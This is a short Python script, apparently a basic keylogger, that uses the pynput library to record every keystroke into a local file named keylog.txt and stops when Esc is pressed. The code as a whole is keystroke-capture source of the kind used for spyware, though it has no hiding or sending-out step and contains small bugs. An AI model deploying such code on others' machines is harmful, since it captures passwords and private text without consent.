from pynput.keyboard import Key, Listener

def write_to_file(key):
    with open("keylog.txt", "a") as f:
        if hasattr(key, 'char'):
            f.write(key.char)
        elif key == key.space:
            f.write(" ")
        elif key == key.enter:
            f.write("\n")       
        elif key == key.backspace:
            f.seek(f.tell()-1,0)
            f.truncate()
        f.flush

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
